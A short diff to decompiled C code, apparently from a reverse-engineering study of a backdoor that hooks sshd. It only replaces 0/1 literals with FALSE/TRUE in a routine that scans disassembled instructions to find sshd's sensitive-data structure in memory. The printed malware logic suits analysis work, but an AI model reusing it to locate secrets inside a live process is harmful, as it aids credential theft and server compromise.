@@ -44,7 +44,7 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   *sensitive_data_out = (void *)0x0;
   call_target = (u8 *)string_refs->entries[0].func_start;
   if (call_target == (u8 *)0x0) {
-    return 0;
+    return FALSE;
   }
   uVar11 = 0xff;
   puVar8 = (u8 *)0x0;
@@ -63,11 +63,11 @@ LAB_001036eb:
   do {
     if ((code_end <= code_start) ||
        (BVar2 = find_call_instruction(code_start,code_end,call_target,(dasm_ctx_t *)local_100),
-       BVar2 == 0)) goto LAB_00103802;
+       BVar2 == FALSE)) goto LAB_00103802;
     code_start = (u8 *)(local_100._0_8_ + local_100._8_8_);
     BVar2 = find_instruction_with_mem_operand_ex
                       (code_start,code_start + 0x20,(dasm_ctx_t *)local_100,0x109,(void *)0x0);
-  } while (BVar2 == 0);
+  } while (BVar2 == FALSE);
   if ((local_100._16_2_ & 0x1040) == 0) {
 LAB_00103788:
     if (uVar11 != 0) {
@@ -107,7 +107,7 @@ LAB_00103802:
       lVar3 = 0;
       do {
         if ((uint)bVar10 <= (uint)lVar3) {
-          return 0;
+          return FALSE;
         }
         lVar4 = 0;
         do {
@@ -116,14 +116,14 @@ LAB_00103802:
             if (((void *)local_a8[lVar3] == (void *)(local_a8[lVar4] + -8)) &&
                (local_a8[lVar4] == local_a8[lVar5] + -8)) {
               *sensitive_data_out = (void *)local_a8[lVar3];
-              return 1;
+              return TRUE;
             }
             lVar5 = lVar5 + 1;
           } while ((uint)lVar5 < (uint)bVar10);
           lVar4 = lVar4 + 1;
         } while ((uint)lVar4 < (uint)bVar10);
         lVar3 = lVar3 + 1;
-      } while( true );
+      } while( TRUE );
     }
   }
   uVar11 = 0;
